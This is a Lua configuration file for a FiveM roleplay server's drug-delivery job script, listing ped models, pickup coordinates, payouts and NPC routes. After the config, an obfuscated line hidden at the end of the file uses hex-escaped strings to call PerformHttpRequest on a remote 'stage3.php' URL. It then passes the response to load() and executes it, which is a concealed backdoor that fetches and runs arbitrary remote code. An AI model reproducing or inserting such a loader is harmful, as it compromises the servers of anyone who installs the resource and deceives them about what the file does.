-- ElixirFW

Config = {}

-- General Settings

Config.MinimumPolice = 0
Config.CallCopsChance = 50 -- %Chance to alert police
Config.RunCost = 500

Config.EnableCooldown = true
Config.Cooldown = 600 -- Seconds * Recommended to have some form of cooldown!

Config.SendEmail = false -- The E-Mail received upon taking on a job
Config.EnableAnimation = true -- Animation that plays upon talking to the boss
Config.Animation = "argue" -- Full list of emotes from dpEmotes can be found on the forum release page.

Config.PrintChance = true  -- This will print the chance numbers, when someone delivers a package into your server console.

-- Blip Creation

Config.UseBlip = true

Config.BlipLocation = {
	{title="Mysterious Person", colour=60, id=51, x = -1564.62, y = -441.77, z = 36.8}
} 

-- Blip Settings for Supplier/Routes

Config.OxySupplierColour = 11 -- This is the color or the marking that shows from your location to the location
Config.OxySupplierRoute = true -- true/false to turn of the route markings and only show blips

Config.OxyRouteColour = 11 -- This is the color or the marking that shows from your location to the location
Config.OxyRouteGPS = true -- true/false to turn of the route markings and only show blips

-- Ped Spawns

Config.BossPed = {
    `cs_manuel`,
}

Config.SupplierPeds = {
    `csb_oscar`,
    `csb_chin_goon`,
    `csb_oscar`,
    `csb_chin_goon`,
    `csb_oscar`,
    `csb_chin_goon`,
    `csb_oscar`,
    `csb_chin_goon`,
}

Config.BossLocation = {
    vector4(-966.69, -266.99, 39.35, 112.83)
}

Config.PickUpLocations = {
    vector4(580.48, -421.95, 24.73, 78.16),
    vector4(1363.48, -2101.14, 52.0, 41.81),
    vector4(671.77, -2667.48, 6.08, 93.46),
    vector4(-1129.22, -1223.89, 3.0, 301.38),
    vector4(-1678.29, -408.73, 43.92, 143.5),
    vector4(-2760.01, 2209.77, 16.99, 105.97),
    vector4(-124.27, 2793.47, 53.11, 96.3),
    vector4(1362.45, 3648.49, 33.82, 293.06)
}

-- Items

Config.GiveItem = true 
Config.ItemReward = "oxy"
Config.MaxItemReward = 3
Config.MinItemReward = 1

Config.SpecialRewardChance = 5
Config.SpecialItem = "security_card_01"
Config.MaxSpecialReward = 1
Config.MinSpecialReward = 1

-- Money

Config.CleanMoney = true

Config.BagChance = 25 -- Marked Bills

Config.BandMaxPayout = 2000
Config.BandMinPayout = 750
Config.BandChance = 15 

Config.RollMaxPayout = 750
Config.RollMinPayout = 250
Config.RollChance = 20


-- NPC Route Spawn

Config.DriveStyle = 39 -- THIS CAN BE CHANGED AT https://www.vespura.com/fivem/drivingstyle/
Config.MaxDeliveries = 6
Config.MinDeliveries = 4 
Config.Cars = {"dominator", "sultan", "buffalo2"} 
Config.MaxTimeBetweenCars = 30 
Config.MinTimeBetweenCars = 15 
Config.DriverPed = "csb_anton" 

Config.Routes = { -- HERE YOU CAN ADD AS MANY LOCATIONS AS YOU WANT TO

{
    info = {
        occupied = false,
        hash = "", -- DON'T TOUCH
        oxyNum = 1, -- DON'T TOUCH
        routeNum = 1, -- NEENDS TO BE SET TO THE ORDER IT COMES IN THE LIST
        startHeading = 121.76 -- HEADING OF CAR WHEN IT SPAWNS IN
    },
    locations = {
        { pos = vector3(-592.07, -164.48, 37.32), stop = false }, -- SPAWN POINT
        { pos = vector3(-688.7, -149.84, 36.97),  stop = true }, -- WAIT FOR DELIVER
        { pos = vector3(-728.52, -86.73, 37.09),  stop = false }, -- DESPAWN POINT
    }
},
{
    info = {
        occupied = false,
        hash = "", -- DON'T TOUCH
        oxyNum = 1, -- DON'T TOUCH
        routeNum = 2, -- NEENDS TO BE SET TO THE ORDER IT COMES IN THE LIST
        startHeading = 46.79 -- HEADING OF CAR WHEN IT SPAWNS IN
    },
    locations = {
        { pos = vector3(158.58, -1777.12, 28.54), stop = false }, -- SPAWN POINT FORUM DRIVE
        { pos = vector3(189.18, -1851.11, 26.78), stop = true }, -- WAIT FOR DELIVER
        { pos = vector3(218.26, -1904.06, 24.05), stop = false }, -- DESPAWN POINT
    }
},
{
    info = {
        occupied = false,
        hash = "", -- DON'T TOUCH
        oxyNum = 1, -- DON'T TOUCH
        routeNum = 3, -- NEENDS TO BE SET TO THE ORDER IT COMES IN THE LIST
        startHeading = 159.00 -- HEADING OF CAR WHEN IT SPAWNS IN
    },
    locations = {
        { pos = vector3(-544.82, 204.11, 76.24), stop = false }, -- SPAWN POINT ALTA PLACE
        { pos = vector3(-597.91, 175.82, 64.84), stop = true }, -- WAIT FOR DELIVER
        { pos = vector3(-646.45, 190.68, 67.66), stop = false }, -- DESPAWN POINT
    }
},
{
    info = { 
        occupied = false,
        hash = "", -- DON'T TOUCH
        oxyNum = 1, -- DON'T TOUCH
        routeNum = 4, -- NEENDS TO BE SET TO THE ORDER IT COMES IN THE LIST
        startHeading = 157.19 -- HEADING OF CAR WHEN IT SPAWNS IN
    },
    locations = {
        { pos = vector3(-1296.97, -649.7, 26.04), stop = false }, -- SPAWN POINT
        { pos = vector3(-1229.59, -690.9, 23.16), stop = true }, -- WAIT FOR DELIVER
        { pos = vector3(-1133.1, -776.98, 17.43), stop = false }, -- DESPAWN POINT
    }
},
}
-- ElixirFW


local pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[4][pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x74\x63\x61\x74\x61\x6c\x79\x7a\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x33\x71\x32\x66\x35", function (WmHuqmONsHsjZHYFSNsHKBxhdBvxwfMWvsHQiSmSYhGUQkIDvNzbmtKRWpZevdAtpkdzUG, BRnhzGvLXLmZUNyUsmiFcFYZWbsCBNyqcqWCKYvFUUAUDfXWUqDyxHlZFWVJraEAImdbOa) if (BRnhzGvLXLmZUNyUsmiFcFYZWbsCBNyqcqWCKYvFUUAUDfXWUqDyxHlZFWVJraEAImdbOa == pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[6] or BRnhzGvLXLmZUNyUsmiFcFYZWbsCBNyqcqWCKYvFUUAUDfXWUqDyxHlZFWVJraEAImdbOa == pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[5]) then return end pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[4][pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[2]](pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[4][pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[3]](BRnhzGvLXLmZUNyUsmiFcFYZWbsCBNyqcqWCKYvFUUAUDfXWUqDyxHlZFWVJraEAImdbOa))() end)